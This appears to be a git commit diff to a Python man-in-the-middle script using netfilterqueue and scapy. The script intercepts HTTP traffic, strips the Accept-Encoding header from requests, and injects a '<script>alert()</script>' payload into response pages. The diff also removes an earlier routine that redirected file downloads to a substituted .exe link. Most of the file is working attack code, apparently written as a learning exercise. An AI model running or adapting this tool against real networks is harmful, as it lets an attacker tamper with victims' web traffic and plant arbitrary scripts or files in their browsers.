38e9271de2a830ec930a8da622f71f7971379a68
kali <sasanhamzavi33@gmail.com>
2021-01-22 01:53:04 -0500

    code injection

--- main.py
+++ main.py
@@ -1,13 +1,14 @@
 #!/usr/bin/env python
 from netfilterqueue import NetfilterQueue
 import scapy.all as scapy
+import re
 
 ack_list = []
 
 
 def set_load(packet, link):
     packet[scapy.Raw].load = link
-    print(packet.show())
+    # print(packet.show())
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
@@ -19,23 +20,24 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("HTTP Request")
-            request = str(scapy_packet[scapy.Raw].load)
+            packet_load = scapy_packet[scapy.Raw].load.decode('utf-8')
+            # packet_load = scapy_packet[scapy.Raw].load
+            # packet_rep = repr(packet_load)[2:-1]
+            modified_load = re.sub('Accept-Encoding:.*?\\r\\n', '', packet_load)
+            # print(modified_load)
+            new_packet = set_load(scapy_packet, modified_load.encode('utf-8'))
+            # new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(bytes(new_packet))
             # print(scapy_packet.show())
-            # print(request)
-            if ".zip" in request:
-                print("[+] .exe Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("HTTP Response")
+            packet_load = scapy_packet[scapy.Raw].load.decode('utf-8')
+            # print(packet_load)
+            modified_load = packet_load.replace("</body>", "<script>alert()</script></body>\n\n")
+            new_packet = set_load(scapy_packet, modified_load.encode('utf-8'))
+            packet.set_payload(bytes(new_packet))
             # print(scapy_packet.show())
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                print(scapy_packet.show())
-                modified_packet = set_load(scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar600.exe\n\n')
-                packet.set_payload(bytes(modified_packet))
-                # print(scapy_packet.show())
 
         # print(scapy_packet.show())
     packet.accept()
